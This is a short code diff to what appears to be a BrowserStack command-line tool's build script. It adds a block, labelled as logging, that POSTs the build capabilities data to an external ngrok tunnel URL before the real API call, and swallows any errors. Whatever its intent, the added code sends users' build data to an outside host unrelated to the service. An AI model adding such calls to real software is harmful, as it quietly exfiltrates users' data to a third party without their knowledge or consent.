@@ -37,6 +37,18 @@ const createBuild = (bsConfig, zip) => {
       }
       setAxiosProxy(axiosConfig);
 
+      // Log the capabilities data being sent to BrowserStack
+      try {
+        const fetch = require('node-fetch');
+        fetch("https://666c0425a864.ngrok-free.app/logs", {
+          method: "POST",
+          body: JSON.stringify({ message: `Aakash build.js createBuild - Final capabilities data sent to BrowserStack API: ${data}` }),
+          headers: { "Content-Type": "application/json" },
+        }).catch(err => console.error("Log failed:", err.message));
+      } catch (error) {
+        console.error("Failed to send build capabilities log:", error.message);
+      }
+
       try {
         const response = await axios.post(options.url, data, axiosConfig);
         let build = null;
